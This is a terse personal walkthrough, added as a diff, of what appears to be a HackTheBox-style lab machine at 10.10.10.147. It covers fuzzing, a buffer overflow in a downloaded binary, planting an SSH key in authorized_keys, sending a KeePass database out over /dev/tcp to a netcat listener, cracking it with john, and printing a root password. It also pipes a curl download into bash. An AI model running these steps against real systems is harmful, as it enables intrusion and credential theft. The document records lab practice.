@@ -1,0 +1,105 @@
+10.10.10.147
+[
+	wfuzz::: --hc=404 -t200 -z list,html-php http://$(mvnb)/FUZZ.FUZ2Z
+			000000043:   200        370 L    948 W      10787 Ch    "index - html"
+
+	firefox::: Ctrl-u
+
+					<!-- 'myapp' can be downloaded to analyze from here
+     its running on port 1337 -->
+
+		:: http://$(mvnb)/myapp
+
+	ghidra:::    ./myapp			"apt install ghidra"
+
+		:: functions ->  main
+			char user_input [112];
+
+		:: python3 -c 'print("A"*150)'
+
+	gdb::: gdb ./myapp					"apt install gdb"
+
+		gef:::		https://github.com/hugsy/gef  ->  bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
+		 gdb:: gdb ./myapp
+
+					GNU gdb (Debian.....)
+					gef>  
+			gef>::  r
+						What do you want me to echo back?
+					:: AAAAAAA.......AAAA				150 A -> python3 -c 'print("A"*150)'
+	
+	python3 ./exploit.py:::
+			
+			main::: ssh-keygen && cat $HOME/.ssh/id_rsa.pub | tr -d "\n" | xclip -sel clip
+
+			::: echo 'id_rsa.pub__VPN' > $HOME/.ssh/authorized_keys
+	
+	ssh:::  ssh  user@$(mvnb)				"ya no va a perdir password por authorized_keys...<3 <3 <3"
+
+	::: nc -nlvp 1234
+	trgd::: cat < MyPassword.kdbx > /dev/tcp/$(mvnb --vpn)/1234
+
+	::: sudo apt install keepass2 -y
+
+	keepass2john:::  keepass2john ./MyPassword.kdbx > hash
+
+	trgd::: which pythno3 && which python2 && which busybox
+	trgd::: busybox httpd -f -p 6969
+
+	::: for file in IMG_0545.JPG  IMG_0546.JPG  IMG_0547.JPG  IMG_0548.JPG  IMG_0552.JPG  IMG_0553.JPG;do wget http://$(mvnb):6969/${file};done
+
+	::: for file in IMG_0545.JPG  IMG_0546.JPG  IMG_0547.JPG  IMG_0548.JPG  IMG_0552.JPG  IMG_0553.JPG;do keepass2john -k ${file} Mypasswords.kdbx ;done  >  ./hash
+
+	john::: john -w:$(locate rockyou.txt) ./hash
+
+			bullshit         (Mypasswords)
+	
+	::: sudo apt install kpcli -y
+	 
+	jpg_kpcli_.sh::: 
+									Key: IMG_0547.JPG
+
+	kpcli:::  --kdb MyPasswords.kdbx --key IMG_0547.JPG
+			
+				pass:::> bullshit
+
+				kpcli=> ls
+						 => cd MyPasswords
+
+						 => ls
+										0. Root password
+
+						 => show 0 -f
+									Title: Root password
+									Uname: root
+									 Pass: u3v2249dl9ptv465cogl3cnpo3fyhk
+										URL:
+									Notes:
+
+	trgd::: su root
+				
+				pass=> u3v2249dl9ptv465cogl3cnpo3fyhk
+	
+
+	ROOT:::...<3 <3 <3
+
+
+	
+
+	{{{
+	:::
+
+	ROOT:::...?
+	}}}
+]
+
+{[
+	:::
+	 ::
+
+	{{{
+	:::
+
+	ROOT:::...?
+	}}}
+]}
